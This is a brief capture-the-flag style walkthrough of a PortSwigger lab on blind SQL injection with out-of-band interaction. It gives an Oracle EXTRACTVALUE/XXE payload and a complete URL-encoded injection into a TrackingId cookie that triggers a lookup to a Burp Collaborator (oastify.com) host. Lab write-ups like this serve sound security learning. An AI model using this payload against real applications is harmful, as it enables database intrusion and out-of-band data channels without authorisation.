https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

Lab objective: `exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.`

# Lab: Blind SQL injection with out-of-band interaction

1. Open burp-suit `Collaborator` tab and click `Copy to clipboard` button. This will give you a unique subdomain. My subdomain is `usq6c7axj5wmu5p5e4z5fn748vem2cq1.oastify.com`
2. Go to cheat sheet and go DNS lookup section and use Oracle payload the payload is `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
3. Now replace the `BURP-COLLABORATOR-SUBDOMAIN` with your subdomain.
4. Because it is a union base attack so you need to add `UNION` first and at last you should URL encode the payload so my payload is `TrackingId=BuDoLyKZ2n0Bxh9u'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//usq6c7axj5wmu5p5e4z5fn748vem2cq1.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
5. Then click `Pull now` from the `Collaborator` tab.